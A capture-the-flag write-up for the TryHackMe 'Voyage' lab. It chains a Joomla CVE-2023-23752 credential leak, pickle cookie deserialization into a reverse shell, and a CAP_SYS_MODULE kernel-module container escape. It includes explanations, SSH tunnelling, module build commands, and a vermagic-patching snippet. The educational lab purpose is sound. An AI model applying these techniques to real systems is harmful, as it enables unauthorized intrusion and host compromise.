## Voyage Writeup

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Voyage/Images/voyage.png)

Room Description: Chain multiple vulnerabilities to gain control of a system.

**Room Link**: [Voyage Room](https://tryhackme.com/room/voyage)

> Sometimes in a pentest, you get root access very quickly. But is it the real root or just a container? The voyage might still be going on.

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Voyage/Images/Screenshot%20From%202026-08-03%2022-09-11.png)

---

## Objectives

1. What is the value of user-level flag?
2. What is the value of root-level flag?

---

## Summary
- **Target IP:** 10.128.162.162
- **OS:** Linux (Ubuntu)
- **Vulnerabilities:** Information Disclosure (CVE), Pickle Insecure Deserialization (RCE), Security Misconfiguration (CAP_SYS_MODULE) leads to Host Pwnage

| Port | State | Service | Service Version / Info |
| --- | --- | --- | --- |
| **`22/tcp`** | `OPEN` | **SSH** | OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 |
| **`80/tcp`** | `OPEN` | **HTTP** | Apache httpd 2.4.58 ((Ubuntu)) - Joomla 4.2.7 |
| **`2222/tcp`** | `OPEN` | **SSH** | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |

---

## Adding target to hosts

```shell
echo -e '10.128.162.162 voyage.thm' | sudo tee -a /etc/hosts
```

---

## Enumeration & Reconnaissance

> Rustscan

```
rustscan -a voyage.thm --ulimit 5000 -- -sCV -O
------------------------------------------------
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 62 Apache httpd 2.4.58 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 1B6942E22443109DAEA739524AB74123
| http-robots.txt: 16 disallowed entries 
| /joomla/administrator/ /administrator/ /api/ /bin/ 
| /cache/ /cli/ /components/ /includes/ /installation/ 
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
2222/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
```

### Web Technology Enumeration

> Whatweb

```shell
 ~# whatweb voyage.thm:80

http://voyage.thm:80 [200 OK] Apache[2.4.58], Cookies[310c29008fc04f792e0bccb4682e5b78], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], HttpOnly[310c29008fc04f792e0bccb4682e5b78], IP[10.128.162.162], MetaGenerator[Joomla! - Open Source Content Management], PasswordField[password], Script[application/json,application/ld+json,module], Title[Home], UncommonHeaders[referrer-policy,cross-origin-opener-policy], X-Frame-Options[SAMEORIGIN]
```

> cmseek

```shell
[✔] Target: http://voyage.thm
[✔] Detected CMS: Joomla
[✔] CMS URL: https://joomla.org
[✔] Joomla Version: 4.2.7
[✔] Readme file: http://voyage.thm/README.txt
[✔] Admin URL: http://voyage.thm/administrator


[✔] Open directories: 4
[*] Open directory url: 
   [>] http://voyage.thmadministrator/templates
   [>] http://voyage.thmadministrator/modules
   [>] http://voyage.thmadministrator/components
   [>] http://voyage.thmimages/banners
```

### Directory Enumeration

```shell
~# feroxbuster -u http://voyage.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

http://voyage.thm/
/robots.txt
/images/
/component/
/templates/
/media/
/index.php
/index.php/component/users/
/index.php/component/users/remind
/index.php/component/users/reset
/plugins/
/includes/
/components/
/api/
/cache/
/tmp/
/layouts/
/administrator/
/cli/
```

### Joomscan - joomla scanner

> So let's scan the target using joomscan, and look if anything is outdated, or we missed anything

```shell
~# joomscan --url http://voyage.thm/ --enumerate-components

[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 4.2.7

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[++] robots.txt is found
path : http://voyage.thm/robots.txt 

Interesting path found from robots.txt
http://voyage.thm/joomla/administrator/
http://voyage.thm/administrator/
http://voyage.thm/api/
http://voyage.thm/bin/
http://voyage.thm/cache/
http://voyage.thm/cli/                       
http://voyage.thm/components/                         
http://voyage.thm/includes/                     
http://voyage.thm/installation/                         
http://voyage.thm/language/                          
http://voyage.thm/layouts/                        
http://voyage.thm/libraries/                             
http://voyage.thm/logs/                          
http://voyage.thm/modules/                           
http://voyage.thm/plugins/         
http://voyage.thm/tmp/ 
```

> I searched for a vulnerable component, but the endpoint did not exist or I did not have access to it.

```shell
└─# searchsploit joomla com_fields 
----------------------------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                                                                                                    |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------- 
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                                                                                                        | php/webapps/42033.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------
```

> Then I found out that this version of `Joomla - 4.2.7` was vulnerable to `CVE-2023-23752`.

**About `CVE-2023-23752`:**

> CVE-2023-23752 is an Improper Access Control / Authentication Bypass vulnerability in the Joomla! Content Management System (CMS). Discovered in February 2023, it allows unauthenticated, remote attackers to access restricted web service endpoints and extract sensitive internal configuration data.

> Vulnerability Type: Improper Access Control (CWE-284) / Information Disclosure

> CVSS v3.1 Score: 5.3 (Medium)

> Affected Versions: Joomla! CMS versions 4.0.0 through 4.2.7

> Patched Version: Joomla! 4.2.8

> Impact: Unauthenticated disclosure of database credentials, system settings, and API secrets.

> Endpoints: `/api/index.php/v1/config/application?public=true`; `/api/index.php/v1/users?public=true` 

*To learn more about it, refer to these sources:* [CVE-2023-23752 Exploit Github](https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT), [Secondary](https://github.com/Pushkarup/CVE-2023-23752/tree/main)

> Exploitation of Vulnerable version: Find the [PoC.py here](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Voyage/joomla-exploit.py). Author : K3ysTr0K3R/CVE-2023-23752-EXPLOIT

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Voyage/Images/Screenshot%20From%202026-08-03%2019-46-04.png)

> Manual exploitation:

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Voyage/Images/Screenshot%20From%202026-08-03%2019-05-54.png)

---

## Initial Foothold & Docker Escape

> I used the exposed credentials to login as root on port 2222 (SSH)

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Voyage/Images/Screenshot%20From%202026-08-03%2019-55-45.png)

> Okay, we are inside a container, and need to escape it somehow. /proc/1/cgroup did not give me anything.

> Capability check: Nothing useful. `capsh --print` echoes the capabilities the user has inside the container. Something like sys_admin capability would have allowed us to mount disk partitions and rwx host files.

```shell
root@f5eb774507f2:~# capsh --print
WARNING: libcap needs an update (cap=40 should have a name).
Current: = cap_chown,cap_dac_override,cap_fowner,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_audit_write+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_audit_write
Ambient set =
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=0(root) euid=0(root)
gid=0(root)
groups=0(root)
Guessed mode: UNCERTAIN (0)
```

> Then I noticed /root/.bash_history had some hinting commands like nmap. I checked the ip address of local machine, and ran an nmap scan.

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Voyage/Images/Screenshot%20From%202026-08-03%2020-18-23.png)

> We found some interesting ports and ip addresses. Let's do an ssh tunnelling to view the website(s) on our kali machine.

```shell
ssh -L 5000:192.168.100.12:5000 root@voyage.thm -p  2222
```

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Voyage/Images/Screenshot%20From%202026-08-03%2020-26-05.png)

> Secret Internal Page:

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Voyage/Images/Screenshot%20From%202026-08-03%2020-26-43.png)

> This endpoint accepts any credential. Found a classified investor list:

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Voyage/Images/Screenshot%20From%202026-08-03%2020-29-36.png)

---

## Insecure Deserialization & RCE: Pickle

**About Pickle Serialization:** 
> Python's pickle module serializes objects using a bytecode-based protocol. When deserializing, it executes the __reduce__ method of any class embedded in the payload, which can return arbitrary system commands. Unlike JSON, there is no safe way to deserialize untrusted Pickle data — the deserialization itself is the execution. The session cookie here was base64/hex-encoded Pickle data trusted directly by the server, meaning controlling the cookie value equals RCE.

> I noticed after logging in, we are assigned a session with value `8004952a000000000000007d94288c0475736572948c097b7b20372a37207d7d948c07726576656e7565948c05383530303094752e`. That seemed random at first, but it was revealed that this hex string is a serialized Python object using pickle. Now, the pickle() itself is unsafe, as if the source is unverified, it can lead to insecure deserialization vulnerability. I created an exact python code that reproduces this hex string, and changed value to an RCE payload.

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Voyage/Images/Screenshot%20From%202026-08-03%2020-59-27.png)

> Generating the serialized object with a custom python script. Find it [here](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Voyage/exploit-pickle.py)

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Voyage/Images/Screenshot%20From%202026-08-03%2021-32-47.png)


## Reverse Shell & Lateral Movement

> Then I changed the session parameter to malicious one, and reloaded the tab:

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Voyage/Images/Screenshot%20From%202026-08-03%2021-29-02-1.png)

> We got the reverse shell on port 4444, and the first flag (user.txt)

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Voyage/Images/Screenshot%20From%202026-08-03%2021-33-22.png)

---

## Privilege Escalation & Docker Escape

> During the local enumeration, I found a dangerous cap given to current user: `CAP_SYS_MODULE`

```shell
capsh --print
```

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Voyage/Images/Screenshot%20From%202026-08-03%2021-52-07.png)

**About SYS_MODULE capability:**

> Shared Kernel Architecture: Unlike Virtual Machines, which run their own isolated guest kernels, containers share the exact same underlying host kernel. Isolation is only enforced via user-space boundaries like namespaces, cgroups, and seccomp filters.

> Ring 0 Execution: The CAP_SYS_MODULE capability grants a process the privilege to invoke init_module() or finit_module() system calls. This allows you to compile and load custom Loadable Kernel Modules (.ko files) directly into Ring 0 (kernel space).

> Bypassing Boundaries: Because the kernel governs the entire system (including all containers and the host itself), executing code inside the kernel completely shatters container isolation. With a malicious kernel module, an attacker can:Disable or modify namespace boundaries.

> 1. Access host filesystems and process trees unrestricted. 2. Spawn a root shell directly on the underlying host machine. 3. Install stealth backdoors or rootkits.


**For this privEsc to work, a few conditions must be satisfied**

- **1. Direct Root Privileges (Root UID)**

- **2. cap_sys_module present**

- **3. The host kernel must not have module loading entirely disabled (/proc/sys/kernel/modules_disabled must be 0)** 


### Exploit Development: Loading malicious module leads to host Pwnage

> To bridge the gap from container user-space to host kernel-space (Ring 0), a Loadable Kernel Module was written to invoke a reverse shell using the kernel's call_usermodehelper API. Find the malicious `C` file [here](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Voyage/exploit.c)

> Write it into a file

```bash
root@d221f7bc7bf8:~# nano exploit.c
```

! > Running Kernel: 6.8.0-1031-aws (uname -r). Available Headers: 6.8.0-1030-aws (found in /lib/modules/ and /usr/src/)

! > Because the target kernel version lacked direct headers, the module was compiled against the existing 6.8.0-1030-aws headers, and the compiled binary's vermagic metadata string was patched to match the running kernel version.


> Then Create the Makefile

```bash
printf "obj-m += exploit.o\nall:\n\tmake -C /lib/modules/6.8.0-1030-aws/build M=\$(PWD) modules\nclean:\n\tmake -C /lib/modules/6.8.0-1030-aws/build M=\$(PWD) clean\n" > Makefile
```

> Compile it

```bash
make
```

> Patch the Vermagic String: 
Since both version strings (6.8.0-1030-aws and 6.8.0-1031-aws) are exactly 13 characters long, a simple binary byte-replacement via Python successfully bypassed the kernel version check.

```bash
root@d221f7bc7bf8:~# python3 -c '
with open("exploit.ko", "rb") as f:
    content = f.read()
content = content.replace(b"6.8.0-1030-aws", b"6.8.0-1031-aws")
with open("exploit.ko", "wb") as f:
    f.write(content)
print("[+] Vermagic patched successfully!")
'
[+] Vermagic patched successfully!
```

> Started listening on port 1234 on kali machine, then inserted the malicious module into kernel.

```bash
insmod exploit.ko
```

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Voyage/Images/Screenshot%20From%202026-08-03%2022-07-22.png)

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Voyage/Images/Screenshot%20From%202026-08-03%2022-06-47.png)

---

> Final Thoughts: In my opinion, this lab was not *Exactly* Medium level. It required some advanced stuff compared to a typical average one, in my opinion. Still, I would not exactly label it as 'Hard'. Anyways, it was fun. See you in another writeup, happy hacking!
